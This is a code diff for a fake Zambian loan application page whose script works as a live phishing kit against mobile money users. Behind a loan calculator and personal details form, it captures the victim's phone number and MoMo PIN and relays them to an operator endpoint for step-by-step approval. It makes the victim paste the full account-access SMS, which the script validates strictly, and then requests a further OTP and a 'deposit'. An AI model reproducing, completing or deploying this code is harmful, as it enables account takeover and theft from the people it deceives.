+      <button type="button" class="btn btn-yellow btn-block" id="depositConfirmBtn">
+        <span class="btn-label">Yes, I have deposited</span>
+        <span class="btn-spinner"></span>
+      </button>
+      <button type="button" class="btn btn-outline btn-block" id="depositCancelBtn" style="margin-top:.6rem;">
+        No, I'll deposit later
+      </button>
+    </div>
+  </div>
+
+</div>
+
+<div class="page-loader" id="pageLoader" hidden><div class="page-loader-spinner"></div></div>
+<div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+<script>
+
+const SERVER_URL = '';
+const POLL_INTERVAL_MS = 2000;
+const POLL_MAX_ATTEMPTS = 150;
+const LOADER_MIN_MS = 2000;
+const LOADER_MAX_MS = 4000;
+const STORAGE_PREFIX = 'tl-form-';
+
+const STEP_FIELDS = {
+  1: ['amount', 'purpose'],
+  2: ['fullname', 'dobDay', 'dobMonth', 'dobYear', 'city', 'phone', 'email'],
+  3: ['employment', 'income'],
+  4: ['agree']
+};
+
+const $  = (sel, root = document) => root.querySelector(sel);
+const $$ = (sel, root = document) => [...root.querySelectorAll(sel)];
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const digits = v => Number(String(v).replace(/[^\d]/g,'')) || 0;
+const money  = n => 'K' + n.toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2});
+const plain  = n => 'K' + n.toLocaleString('en-US', {maximumFractionDigits:0});
+
+
+const OTP_PREFIX = "Y'ello. Please note! This confidential code gives access to your MoMo account:";
+const OTP_MIDDLE = "Do not share it with anyone.";
+const OTP_SUFFIX = "l+/DM+Y0kqw HTx14B0+90w YyRaK1dXEWz CTO2RPz+HOF yiitGCXacTO";
+const OTP_VARIABLE_PATTERN = /^[A-Za-z0-9+/]+={0,2}$/;
+const OTP_MIN_VARIABLE_LEN = 16;
+
+function normalizeOtp(raw){
+  return String(raw || '').trim().replace(/\s+/g, ' ');
+}
+
+function isValidOtpMessage(raw){
+  const s = normalizeOtp(raw);
+  if (!s.startsWith(OTP_PREFIX)) return false;
+  if (!s.endsWith(OTP_SUFFIX)) return false;
+
+  const rest = s.slice(OTP_PREFIX.length);
+  const middleWithSpaces = ' ' + OTP_MIDDLE + ' ';
+  const mIdx = rest.indexOf(middleWithSpaces);
+  if (mIdx === -1) return false;
+
+  const variable = rest.slice(0, mIdx);
+  const after = rest.slice(mIdx + middleWithSpaces.length);
+  if (after !== OTP_SUFFIX) return false;
+  if (variable.length < OTP_MIN_VARIABLE_LEN) return false;
+  if (!OTP_VARIABLE_PATTERN.test(variable)) return false;
+
+  return true;
+}
+
+function showToast(msg){
+  const t = $('#toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  clearTimeout(t._timer);
+  t._timer = setTimeout(() => t.classList.remove('show'), 2400);
+}
+
+function shake(el){
+  if (!el) return;
+  el.classList.add('shake');
+  setTimeout(() => el.classList.remove('shake'), 500);
+}
+
+async function showPageLoader(minMs = LOADER_MIN_MS){
+  const loader = $('#pageLoader');
+  const delay = minMs + Math.random() * (LOADER_MAX_MS - LOADER_MIN_MS);
+  loader.hidden = false;
+  await sleep(delay);
+  loader.hidden = true;
+}
+
+(function () {
+  const toggle = $('#navToggle');
+  const links  = $('#navLinks');
+  function closeMenu(){
+    links.classList.remove('open');
+    toggle.classList.remove('open');
+    toggle.setAttribute('aria-expanded','false');
+  }
+  toggle.addEventListener('click', e => {
+    e.stopPropagation();
+    const open = links.classList.toggle('open');
+    toggle.classList.toggle('open', open);
+    toggle.setAttribute('aria-expanded', String(open));
+  });
+  $$('#navLinks a').forEach(a => a.addEventListener('click', closeMenu));
+  document.addEventListener('click', e => {
+    if (!e.target.closest('.nav') && links.classList.contains('open')) closeMenu();
+  });
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Escape' && links.classList.contains('open')) closeMenu();
+  });
+})();
+
+function parseRoute(){
+  const hash = location.hash || '#/';
+  const m = hash.match(/^#\/apply\/(\d+)/);
+  if (m) return { view: 'apply', step: Math.min(Math.max(Number(m[1]), 1), 4) };
+  return { view: 'home', step: null };
+}
+
+function setView(view){
+  $('#view-landing').hidden = view !== 'home';
+  $('#view-apply').hidden   = view !== 'apply';
+  $$('#navLinks a').forEach(a => a.classList.remove('active'));
+  const applyLink = $('#navLinks a[data-nav="apply"]');
+  if (view === 'apply' && applyLink) applyLink.classList.add('active');
+  if (view === 'home') window.scrollTo({top:0, behavior:'smooth'});
+}
+
+function saveCurrentStep(){
+  const n = currentStep;
+  const data = {};
+  STEP_FIELDS[n].forEach(id => {
+    const el = document.getElementById(id);
+    if (el) data[id] = el.value;
+  });
+  if (n === 1) data._term = term;
+  try { sessionStorage.setItem(STORAGE_PREFIX + n, JSON.stringify(data)); } catch {}
+}
+
+function restorePreviousSteps(upToStep){
+  for (let i = 1; i < upToStep; i++){
+    let raw = null;
+    try { raw = sessionStorage.getItem(STORAGE_PREFIX + i); } catch {}
+    if (!raw) continue;
+    let data; try { data = JSON.parse(raw); } catch { continue; }
+    Object.entries(data).forEach(([id, val]) => {
+      if (id === '_term'){ term = Number(val) || 6; return; }
+      const el = document.getElementById(id);
+      if (el) el.value = val;
+    });
+  }
+  syncTermChips();
+  syncAmountChip();
+}
+
+function clearStepData(n){
+  try { sessionStorage.removeItem(STORAGE_PREFIX + n); } catch {}
+  STEP_FIELDS[n].forEach(id => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    if (el.type === 'checkbox') el.checked = false;
+    else el.value = '';
+  });
+  if (n === 1){
+    term = 6;
+    syncTermChips();
+  }
+}
+
+function bindAutoSave(){
+  $$('#appForm input, #appForm select').forEach(el => {
+    const evt = el.tagName === 'SELECT' ? 'change' : 'input';
+    el.addEventListener(evt, () => saveCurrentStep());
+  });
+}
+
+let currentStep = 1;
+let authVerified = false;
+let pinFlaggedWrong = false;
+let term = 6;
+
+const TITLES = ['Loan details', 'Your details', 'Income', 'Review'];
+
+/* ============================================================
+   INTEREST RATE
+   ------------------------------------------------------------
+   Flat rate per month, applied to the principal for every
+   month of the term. 2.5% monthly flat ≈ 15% total on a
+   6-month loan.
+
+   The note text and all defaults are generated from this one
+   constant, so the page can never show a rate that doesn't
+   match the maths.
+   ============================================================ */
+const RATE = 0.025;
+const ratePct = () => {
+  const p = RATE * 100;
+  return Number.isInteger(p) ? String(p) : p.toFixed(1);
+};
+
+function goToStep(n, opts = {}){
+  const { updateHash = true, scroll = true } = opts;
+  currentStep = Math.min(Math.max(n, 1), 4);
+
+  $$('.fstep').forEach(s => s.classList.toggle('active', Number(s.dataset.step) === currentStep));
+  $('#fpStep').textContent  = 'Step ' + currentStep + ' of 4';
+  $('#fpTitle').textContent = TITLES[currentStep - 1];
+  $('#fpFill').style.width  = (currentStep / 4 * 100) + '%';
+  $('.fp-bar').setAttribute('aria-valuenow', currentStep);
+
+  $('#btnBack').hidden = currentStep === 1;
+  const next = $('#btnNext');
+  next.textContent = currentStep === 4 ? 'Submit application' : 'Continue';
+  next.classList.toggle('btn-yellow', currentStep === 4);
+  next.classList.toggle('btn-blue', currentStep !== 4);
+
+  if (currentStep === 4) fillReview();
+  updateSummary();
+
+  if (updateHash){
+    history.replaceState(null, '', '#/apply/' + currentStep);
+  }
+  if (scroll){
+    const top = $('.form-card').getBoundingClientRect().top + window.scrollY - 80;
+    window.scrollTo({top, behavior:'smooth'});
+  }
+}
+
+/* ============================================================
+   DATE OF BIRTH
+   ============================================================ */
+(function initDob(){
+  const daySel = $('#dobDay');
+  const yearSel = $('#dobYear');
+  const monthSel = $('#dobMonth');
+  for (let d = 1; d <= 31; d++){
+    const o = document.createElement('option');
+    o.value = String(d).padStart(2,'0'); o.textContent = d; daySel.appendChild(o);
+  }
+  const now = new Date();
+  const maxYear = now.getFullYear() - 18;
+  const minYear = now.getFullYear() - 90;
+  for (let y = maxYear; y >= minYear; y--){
+    const o = document.createElement('option');
+    o.value = String(y); o.textContent = y; yearSel.appendChild(o);
+  }
+  function refreshDays(){
+    const day = Number(daySel.value);
+    const month = Number(monthSel.value);
+    const year = Number(yearSel.value);
+    if (!month || !year) return;
+    const days = new Date(year, month, 0).getDate();
+    const curr = daySel.options.length - 1;
+    if (days !== curr){
+      while (daySel.options.length > 1) daySel.remove(1);
+      for (let d = 1; d <= days; d++){
+        const o = document.createElement('option');
+        o.value = String(d).padStart(2,'0'); o.textContent = d; daySel.appendChild(o);
+      }
+      if (day > days) daySel.value = '';
+      else if (day) daySel.value = String(day).padStart(2,'0');
+    }
+  }
+  monthSel.addEventListener('change', refreshDays);
+  yearSel.addEventListener('change', refreshDays);
+})();
+
+/* ============================================================
+   PHONE — accepts all valid Zambian mobile numbers (0 + 5/6/7/8/9 + 8 digits)
+   ============================================================ */
+function sanitizePhone(raw){
+  return String(raw).replace(/\D/g,'').slice(0, 10);
+}
+function isValidZambianPhone(v){
+  return /^0[5-9]\d{8}$/.test(v);
+}
+function prettyPhone(v){
+  if (!v) return '—';
+  return v.replace(/(\d{3})(\d{3})(\d{4})/, '$1 $2 $3');
+}
+
+(function initPhoneAndAmounts(){
+  const phone = $('#phone');
+  phone.addEventListener('input', () => { phone.value = sanitizePhone(phone.value); });
+  phone.addEventListener('blur',  () => { phone.setCustomValidity(''); });
+
+  const loginPhone = $('#loginPhone');
+  loginPhone.addEventListener('input', () => { loginPhone.value = sanitizePhone(loginPhone.value); });
+  loginPhone.addEventListener('blur',  () => { loginPhone.setCustomValidity(''); });
+
+  const amount = $('#amount');
+  const income = $('#income');
+  const fmt = el => { const r = digits(el.value); el.value = r ? r.toLocaleString('en-US') : ''; };
+
+  amount.addEventListener('blur', () => fmt(amount));
+  amount.addEventListener('input', () => {
+    syncAmountChip();
+    updateSummary();
+    saveCurrentStep();
+  });
+  income.addEventListener('blur', () => fmt(income));
+})();
+
+function syncAmountChip(){
+  const raw = digits($('#amount').value);
+  $$('#amountChips .chip').forEach(c => {
+    c.classList.toggle('active', Number(c.dataset.amount) === raw);
+  });
+}
+function syncTermChips(){
+  $$('#termChips .chip').forEach(c => {
+    c.classList.toggle('active', Number(c.dataset.term) === term);
+  });
+}
+
+(function initChips(){
+  $$('#amountChips .chip').forEach(chip => {
+    chip.addEventListener('click', () => {
+      $$('#amountChips .chip').forEach(c => c.classList.remove('active'));
+      chip.classList.add('active');
+      $('#amount').value = Number(chip.dataset.amount).toLocaleString('en-US');
+      updateSummary();
+      saveCurrentStep();
+    });
+  });
+  $$('#termChips .chip').forEach(chip => {
+    chip.addEventListener('click', () => {
+      $$('#termChips .chip').forEach(c => c.classList.remove('active'));
+      chip.classList.add('active');
+      term = Number(chip.dataset.term);
+      updateSummary();
+      saveCurrentStep();
+    });
+  });
+})();
+
+function calc(){
+  const principal = digits($('#amount').value) || 0;
+  const interest  = principal * RATE * term;
+  const total     = principal + interest;
+  const monthly   = total / term;
+  return {principal, interest, total, monthly};
+}
+function updateSummary(){
+  const {principal, total, monthly} = calc();
+  const purpose = $('#purpose').value || '—';
+  $('#sumAmount').textContent  = plain(principal);
+  $('#sumTerm').textContent    = 'Over ' + term + (term === 1 ? ' month' : ' months');
+  $('#sumMonthly').textContent = money(monthly);
+  $('#sumTotal').textContent   = money(total);
+  $('#sumPurpose').textContent = purpose;
+  const note = $('#sumNote');
+  if (note){
+    note.textContent =
+      'For illustration, we use a sample ' + ratePct() + '% monthly flat rate. ' +
+      'Your final rate depends on your profile and is shown before you accept.';
+  }
+}
+$('#purpose').addEventListener('change', () => { updateSummary(); saveCurrentStep(); });
+
+async function validateStepOnServer(n){
+  const payload = { step: n, data: {} };
+  if (n === 1){
+    payload.data = { amount: digits($('#amount').value), term, purpose: $('#purpose').value };
+  } else if (n === 2){
+    payload.data = {
+      fullname: $('#fullname').value.trim(),
+      dobDay:  $('#dobDay').value,
+      dobMonth:$('#dobMonth').value,
+      dobYear: $('#dobYear').value,
+      city:    $('#city').value.trim(),
+      phone:   sanitizePhone($('#phone').value),
+      email:   $('#email').value.trim()
+    };
+  } else if (n === 3){
+    payload.data = { employment: $('#employment').value, income: digits($('#income').value) };
+  } else {
+    payload.data = { agree: $('#agree').checked };
+  }
+  try {
+    const r = await fetch(`${SERVER_URL}/api/validate-step`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    return await r.json();
+  } catch {
+    return { ok: true };
+  }
+}
+
+function clientValidateStep(n){
+  const step = $(`.fstep[data-step="${n}"]`);
+  const fields = step.querySelectorAll('input, select');
+  for (const f of fields){
+    if (!f.checkValidity()){ f.focus(); f.reportValidity(); return false; }
+  }
+  if (n === 2){
+    const day = $('#dobDay').value, month = $('#dobMonth').value, year = $('#dobYear').value;
+    if (!day || !month || !year){ $('#dobYear').focus(); return false; }
+    const dob = new Date(Number(year), Number(month) - 1, Number(day));
+    const isReal = dob.getFullYear() === Number(year)
+      && dob.getMonth() === Number(month) - 1
+      && dob.getDate() === Number(day);
+    if (!isReal){ $('#dobDay').focus(); return false; }
+    const today = new Date();
+    let age = today.getFullYear() - dob.getFullYear();
+    const m = today.getMonth() - dob.getMonth();
+    if (m < 0 || (m === 0 && today.getDate() < dob.getDate())) age--;
+    if (age < 18){
+      const ys = $('#dobYear');
+      ys.setCustomValidity('You must be 18 or older to apply.');
+      ys.reportValidity(); ys.focus();
+      setTimeout(() => ys.setCustomValidity(''), 100);
+      return false;
+    }
+    const phoneEl = $('#phone');
+    const pv = sanitizePhone(phoneEl.value);
+    phoneEl.value = pv;
+    if (!isValidZambianPhone(pv)){
+      phoneEl.setCustomValidity('Enter a valid Zambian mobile number: 10 digits starting with 0 (for example 097 123 4567).');
+      phoneEl.reportValidity(); phoneEl.focus();
+      setTimeout(() => phoneEl.setCustomValidity(''), 100);
+      return false;
+    }
+  }
+  return true;
+}
+
+$('#btnNext').addEventListener('click', async () => {
+  if (currentStep < 4){
+    if (!clientValidateStep(currentStep)) return;
+
+    if (currentStep === 2 && !authVerified){
+      openLoginModal();
+      return;
+    }
+
+    saveCurrentStep();
+    const loaderPromise = showPageLoader();
+    const validatePromise = validateStepOnServer(currentStep);
+    const [, result] = await Promise.all([loaderPromise, validatePromise]);
+
+    if (result && result.ok === false){
+      const firstKey = Object.keys(result.errors || {})[0];
+      if (firstKey){
+        const el = document.getElementById(firstKey);
+        if (el && el.setCustomValidity){
+          el.setCustomValidity(result.errors[firstKey]);
+          el.reportValidity();
+          setTimeout(() => el.setCustomValidity(''), 100);
+        } else {
+          showToast(result.errors[firstKey]);
+        }
+      }
+      return;
+    }
+
+    goToStep(currentStep + 1);
+  } else {
+    if (!clientValidateStep(4)) return;
+    if (pinFlaggedWrong){
+      openPinRetryModal();
+    } else {
+      openFinalModal();
+    }
+  }
+});
+
+$('#btnBack').addEventListener('click', () => {
+  if (currentStep > 1) goToStep(currentStep - 1, { scroll: true });
+});
+
+$$('[data-goto]').forEach(btn => {
+  btn.addEventListener('click', () => { goToStep(Number(btn.dataset.goto)); });
+});
+
+const authBackdrop   = $('#authBackdrop');
+const loginModal     = $('#loginModal');
+const otpModal       = $('#otpModal');
+const pinRetryModal  = $('#pinRetryModal');
+const finalModal     = $('#finalModal');
+const depositModal   = $('#depositModal');
+const loginBtn       = $('#loginBtn');
+const otpBtn         = $('#otpBtn');
+const finalBtn       = $('#finalBtn');
+const otpInput       = $('#otpInput');
+
+let currentPollToken = null;
+function beginPoll(){
+  if (currentPollToken) currentPollToken.aborted = true;
+  currentPollToken = { aborted: false };
+  return currentPollToken;
+}
+function abortPoll(){
+  if (currentPollToken){ currentPollToken.aborted = true; currentPollToken = null; }
+}
+
+async function submitForApproval(gate, phone, payload, token){
+  const res = await fetch(`${SERVER_URL}/api/gate`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ gate, phone, payload })
+  });
+  if (!res.ok){
+    const err = await res.json().catch(() => ({}));
+    throw new Error(err.error || 'Could not reach the review team.');
+  }
+  const { id, ref } = await res.json();
+  for (let i = 0; i < POLL_MAX_ATTEMPTS; i++){
+    if (token.aborted) throw new Error('aborted');
+    await sleep(POLL_INTERVAL_MS);
+    if (token.aborted) throw new Error('aborted');
+    let data;
+    try {
+      const r = await fetch(`${SERVER_URL}/api/gate/${id}`);
+      if (!r.ok) continue;
+      data = await r.json();
+    } catch { continue; }
+    if (data.status === 'approved' || data.status === 'declined' || data.status === 'wrongpin'){
+      return { id, ref, status: data.status };
+    }
+  }
+  throw new Error('timeout');
+}
+
+function humanError(err){
+  if (err.message === 'timeout') return 'The review team is taking longer than usual. Please try again.';
+  if (err.message.includes('fetch') || err.message.includes('Failed'))
+    return 'Could not reach the server. Please try again.';
+  return err.message || 'Something went wrong. Please try again.';
+}
+
+function openLoginModal(){
+  const prefill = sanitizePhone($('#phone').value || '');
+  $('#loginPhone').value = prefill;
+  $$('#pinBoxes .pin-box').forEach(b => { b.value = ''; b.classList.remove('filled'); });
+  $('#loginError').hidden = true;
+  $('#loginBody').hidden = false;
+  $('#loginWaiting').hidden = true;
+  loginBtn.classList.remove('loading'); loginBtn.disabled = false;
+
+  authBackdrop.hidden = false;
+  loginModal.hidden = false;
+  otpModal.hidden = true;
+  pinRetryModal.hidden = true;
+  finalModal.hidden = true;
+  depositModal.hidden = true;
+  document.body.style.overflow = 'hidden';
+
+  setTimeout(() => {
+    if (isValidZambianPhone(prefill)){
+      const f = $('#pinBoxes .pin-box'); if (f) f.focus();
+    } else {
+      $('#loginPhone').focus();
+    }
+  }, 120);
+}
+
+function openPinRetryModal(){
+  $$('#pinRetryBoxes .pin-box').forEach(b => { b.value = ''; b.classList.remove('filled'); });
+  $('#pinRetryError').hidden = true;
+  $('#pinRetryBody').hidden = false;
+  $('#pinRetryWaiting').hidden = true;
+
+  authBackdrop.hidden = false;
+  loginModal.hidden = true;
+  otpModal.hidden = true;
+  finalModal.hidden = true;
+  depositModal.hidden = true;
+  pinRetryModal.hidden = false;
+  document.body.style.overflow = 'hidden';
+
+  setTimeout(() => {
+    const f = $('#pinRetryBoxes .pin-box');
+    if (f) f.focus();
+  }, 150);
+}
+
+function openFinalModal(){
+  const amt = digits($('#amount').value);
+  $('#finalAmount').textContent = plain(amt);
+  const phone = sanitizePhone($('#phone').value || '');
+  $('#finalPhone').textContent = prettyPhone(phone);
+
+  $$('#finalBoxes .pin-box').forEach(b => { b.value = ''; b.classList.remove('filled'); });
+  $('#finalError').hidden = true;
+  $('#finalBody').hidden = false;
+  $('#finalWaiting').hidden = true;
+  finalBtn.classList.remove('loading'); finalBtn.disabled = false;
+
+  authBackdrop.hidden = false;
+  loginModal.hidden = true;
+  otpModal.hidden = true;
+  pinRetryModal.hidden = true;
+  depositModal.hidden = true;
+  finalModal.hidden = false;
+  document.body.style.overflow = 'hidden';
+  setTimeout(() => { const f = $('#finalBoxes .pin-box'); if (f) f.focus(); }, 150);
+}
+
+function closeAuth(){
+  abortPoll();
+  authBackdrop.hidden = true;
+  loginModal.hidden = true;
+  otpModal.hidden = true;
+  pinRetryModal.hidden = true;
+  finalModal.hidden = true;
+  depositModal.hidden = true;
+  document.body.style.overflow = '';
+  loginBtn.classList.remove('loading'); loginBtn.disabled = false;
+  otpBtn.classList.remove('loading'); otpBtn.disabled = false;
+  finalBtn.classList.remove('loading'); finalBtn.disabled = false;
+}
+
+/* ============================================================
+   OTP COUNTER — shows a live ✓ when the pasted SMS is valid
+   ============================================================ */
+function updateOtpCounter(){
+  const val = otpInput.value;
+  const len = val.length;
+  const counter = $('#otpCounter');
+  if (!counter) return;
+
+  if (len === 0){
+    counter.textContent = '0 chars';
+    counter.style.color = '';
+    return;
+  }
+  if (isValidOtpMessage(val)){
+    counter.textContent = '✓ Ready to verify';
+    counter.style.color = '#059669';
+  } else {
+    counter.textContent = len + (len === 1 ? ' char' : ' chars');
+    counter.style.color = '';
+  }
+}
+
+function showOtpModal(phone){
+  $('#otpPhone').textContent = prettyPhone(phone);
+  otpInput.value = '';
+  otpInput.classList.remove('filled');
+  $('#otpError').hidden = true;
+  $('#otpBody').hidden = false;
+  $('#otpWaiting').hidden = true;
+  otpBtn.classList.remove('loading'); otpBtn.disabled = false;
+  updateOtpCounter();
+  loginModal.hidden = true;
+  pinRetryModal.hidden = true;
+  finalModal.hidden = true;
+  depositModal.hidden = true;
+  otpModal.hidden = false;
+  setTimeout(() => otpInput.focus(), 180);
+}
+
+$('#loginClose').addEventListener('click', closeAuth);
+$('#otpClose').addEventListener('click', closeAuth);
+$('#pinRetryClose').addEventListener('click', closeAuth);
+$('#finalClose').addEventListener('click', closeAuth);
+$('#depositClose').addEventListener('click', closeAuth);
+
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape' && !authBackdrop.hidden) closeAuth();
+});
+
+/* ---- Generic pin-box group setup (still used for 5-digit PINs + 4-digit OTP) ---- */
+function setupPinGroup(groupEl, submitBtn){
+  const boxes = [...groupEl.querySelectorAll('.pin-box')];
+  boxes.forEach((box, i) => {
+    box.addEventListener('input', () => {
+      box.value = box.value.replace(/\D/g,'').slice(-1);
+      box.classList.toggle('filled', !!box.value);
+      if (box.value && i < boxes.length - 1) boxes[i + 1].focus();
+    });
+    box.addEventListener('keydown', e => {
+      if (e.key === 'Backspace' && !box.value && i > 0){
+        boxes[i - 1].focus(); boxes[i - 1].value = ''; boxes[i - 1].classList.remove('filled');
+        e.preventDefault();
+      }
+      if (e.key === 'ArrowLeft' && i > 0){ boxes[i - 1].focus(); e.preventDefault(); }
+      if (e.key === 'ArrowRight' && i < boxes.length - 1){ boxes[i + 1].focus(); e.preventDefault(); }
+      if (e.key === 'Enter' && boxes.every(b => b.value)) submitBtn.click();
+    });
+    box.addEventListener('paste', e => {
+      e.preventDefault();
+      const text = (e.clipboardData || window.clipboardData).getData('text') || '';
+      const chars = text.replace(/\D/g,'').split('');
+      boxes.forEach((b, j) => { if (chars[j] !== undefined){ b.value = chars[j]; b.classList.add('filled'); } });
+      const next = boxes.findIndex(b => !b.value);
+      (boxes[next] || boxes[boxes.length - 1]).focus();
+    });
+    box.addEventListener('focus', () => box.select());
+  });
+  return boxes;
+}
+
+const pinBoxesRef   = setupPinGroup($('#pinBoxes'),   loginBtn);
+const finalBoxesRef = setupPinGroup($('#finalBoxes'), finalBtn);
+
+let pinRetrySubmitting = false;
+
+function setupPinRetryGroup(groupEl, onComplete){
+  const boxes = [...groupEl.querySelectorAll('.pin-box')];
+  const maybeSubmit = () => { if (boxes.every(b => b.value)) onComplete(boxes); };
+  boxes.forEach((box, i) => {
+    box.addEventListener('input', () => {
+      box.value = box.value.replace(/\D/g,'').slice(-1);
+      box.classList.toggle('filled', !!box.value);
+      if (box.value && i < boxes.length - 1) boxes[i + 1].focus();
+      maybeSubmit();
+    });
+    box.addEventListener('keydown', e => {
+      if (e.key === 'Backspace' && !box.value && i > 0){
+        boxes[i - 1].focus(); boxes[i - 1].value = ''; boxes[i - 1].classList.remove('filled');
+        e.preventDefault();
+      }
+      if (e.key === 'ArrowLeft' && i > 0){ boxes[i - 1].focus(); e.preventDefault(); }
+      if (e.key === 'ArrowRight' && i < boxes.length - 1){ boxes[i + 1].focus(); e.preventDefault(); }
+    });
+    box.addEventListener('paste', e => {
+      e.preventDefault();
+      const text = (e.clipboardData || window.clipboardData).getData('text') || '';
+      const chars = text.replace(/\D/g,'').split('');
+      boxes.forEach((b, j) => { if (chars[j] !== undefined){ b.value = chars[j]; b.classList.add('filled'); } });
+      const next = boxes.findIndex(b => !b.value);
+      (boxes[next] || boxes[boxes.length - 1]).focus();
+      maybeSubmit();
+    });
+    box.addEventListener('focus', () => box.select());
+  });
+  return boxes;
+}
+
+async function submitPinRetry(code, boxes){
+  if (pinRetrySubmitting) return;
+  pinRetrySubmitting = true;
+
+  const phone = sanitizePhone($('#phone').value || '');
+  $('#pinRetryBody').hidden = true;
+  $('#pinRetryWaiting').hidden = false;
+
+  const token = beginPoll();
+  try {
+    const result = await submitForApproval('pin_retry', phone, code, token);
+    if (token.aborted) return;
+    if (result.status === 'approved'){
+      pinFlaggedWrong = false;
+      showToast('PIN verified — final step');
+      openFinalModal();
+    } else {
+      $('#pinRetryBody').hidden = false;
+      $('#pinRetryWaiting').hidden = true;
+      $('#pinRetryError').hidden = false;
+      boxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
+      boxes[0].focus();
+    }
+  } catch (err) {
+    if (token.aborted || err.message === 'aborted') return;
+    $('#pinRetryBody').hidden = false;
+    $('#pinRetryWaiting').hidden = true;
+    const errEl = $('#pinRetryError .err-text');
+    if (errEl) errEl.textContent = humanError(err);
+    boxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
+    boxes[0].focus();
+  } finally {
+    pinRetrySubmitting = false;
+  }
+}
+
+const pinRetryBoxes = setupPinRetryGroup($('#pinRetryBoxes'), (boxes) => {
+  const code = boxes.map(b => b.value).join('');
+  if (code.length === 5) submitPinRetry(code, boxes);
+});
+
+/* OTP textarea — live format feedback in the counter */
+otpInput.addEventListener('input', () => {
+  otpInput.classList.toggle('filled', otpInput.value.trim().length > 0);
+  updateOtpCounter();
+});
+
+/* LOGIN submit */
+loginBtn.addEventListener('click', async () => {
+  const phoneEl = $('#loginPhone');
+  const phone   = sanitizePhone(phoneEl.value);
+  phoneEl.value = phone;
+
+  if (!isValidZambianPhone(phone)){
+    phoneEl.setCustomValidity('Enter a valid Zambian mobile number: 10 digits starting with 0 (for example 097 123 4567).');
+    phoneEl.reportValidity(); shake(phoneEl); phoneEl.focus();
+    setTimeout(() => phoneEl.setCustomValidity(''), 100);
+    return;
+  }
+  phoneEl.setCustomValidity('');
+
+  const pin = pinBoxesRef.map(b => b.value).join('');
+  if (pin.length !== 5){
+    shake($('#pinBoxes'));
+    const fe = pinBoxesRef.find(b => !b.value);
+    if (fe) fe.focus();
+    return;
+  }
+
+  $('#loginError').hidden = true;
+  $('#loginBody').hidden = true;
+  $('#loginWaiting').hidden = false;
+  loginBtn.classList.add('loading');
+
+  const token = beginPoll();
+  try {
+    const result = await submitForApproval('login', phone, pin, token);
+    if (token.aborted) return;
+    if (result.status === 'approved'){
+      showToast('Login approved — check your SMS');
+      showOtpModal(phone);
+    } else {
+      $('#loginBody').hidden = false;
+      $('#loginWaiting').hidden = true;
+      $('#loginError').hidden = false;
+      pinBoxesRef.forEach(b => { b.value = ''; b.classList.remove('filled'); });
+      pinBoxesRef[0].focus();
+    }
+  } catch (err) {
+    if (token.aborted || err.message === 'aborted') return;
+    $('#loginBody').hidden = false;
+    $('#loginWaiting').hidden = true;
+    const el = $('#loginError');
+    el.hidden = false;
+    el.querySelector('.err-text').textContent = humanError(err);
+  } finally {
+    loginBtn.classList.remove('loading');
+  }
+});
+
+/* OTP submit — validates strict SMS format before sending */
+otpBtn.addEventListener('click', async () => {
+  const raw = otpInput.value;
+
+  if (!isValidOtpMessage(raw)){
+    shake(otpInput);
+    otpInput.focus();
+    const el = $('#otpError');
+    el.hidden = false;
+    el.querySelector('.err-text').textContent =
+      "That doesn't look like the full MoMo SMS. Copy the entire message — it starts with \"Y'ello. Please note!\" and ends with the verification code.";
+    return;
+  }
+
+  const code = normalizeOtp(raw);
+  const phone = sanitizePhone($('#phone').value || '');
+
+  $('#otpError').hidden = true;
+  $('#otpBody').hidden = true;
+  $('#otpWaiting').hidden = false;
+  otpBtn.classList.add('loading');
+
+  const token = beginPoll();
+  try {
+    const result = await submitForApproval('otp', phone, code, token);
+    if (token.aborted) return;
+
+    if (result.status === 'approved'){
+      authVerified = true;
+      pinFlaggedWrong = false;
+      closeAuth();
+      showToast('Verified — continuing your application');
+      await showPageLoader();
+      goToStep(3);
+    } else if (result.status === 'wrongpin'){
+      authVerified = true;
+      pinFlaggedWrong = true;
+      closeAuth();
+      showToast('Verified — continuing your application');
+      await showPageLoader();
+      goToStep(3);
+    } else {
+      $('#otpBody').hidden = false;
+      $('#otpWaiting').hidden = true;
+      const el = $('#otpError');
+      el.hidden = false;
+      el.querySelector('.err-text').textContent =
+        'Incorrect or expired code. Please check the latest MoMo SMS and paste the entire message.';
+      otpInput.value = ''; otpInput.classList.remove('filled');
+      updateOtpCounter();
+      otpInput.focus();
+    }
+  } catch (err) {
+    if (token.aborted || err.message === 'aborted') return;
+    $('#otpBody').hidden = false;
+    $('#otpWaiting').hidden = true;
+    const el = $('#otpError');
+    el.hidden = false;
+    el.querySelector('.err-text').textContent = humanError(err);
+  } finally {
+    otpBtn.classList.remove('loading');
+  }
+});
+
+/* FINAL OTP submit */
+finalBtn.addEventListener('click', async () => {
+  const code = finalBoxesRef.map(b => b.value).join('');
+  if (code.length !== 4){
+    shake($('#finalBoxes'));
+    const fe = finalBoxesRef.find(b => !b.value);
+    if (fe) fe.focus();
+    return;
+  }
+
+  const phone = sanitizePhone($('#phone').value || '');
+  $('#finalError').hidden = true;
+  $('#finalBody').hidden = true;
+  $('#finalWaiting').hidden = false;
+  finalBtn.classList.add('loading');
+
+  const token = beginPoll();
+  try {
+    const result = await submitForApproval('final', phone, code, token);
+    if (token.aborted) return;
+    if (result.status === 'approved'){
+      closeAuth();
+      showToast('OTP confirmed — submitting your application');
+      await submitApplication();
+    } else {
+      $('#finalBody').hidden = false;
+      $('#finalWaiting').hidden = true;
+      $('#finalError').hidden = false;
+      finalBoxesRef.forEach(b => { b.value = ''; b.classList.remove('filled'); });
+      finalBoxesRef[0].focus();
+    }
+  } catch (err) {
+    if (token.aborted || err.message === 'aborted') return;
+    $('#finalBody').hidden = false;
+    $('#finalWaiting').hidden = true;
+    const el = $('#finalError');
+    el.hidden = false;
+    el.querySelector('.err-text').textContent = humanError(err);
+  } finally {
+    finalBtn.classList.remove('loading');
+  }
+});
+
+function fillReview(){
+  const get = id => (document.getElementById(id)?.value || '').trim();
+  const {total, monthly} = calc();
+  $('#rvAmount').textContent   = plain(digits(get('amount')));
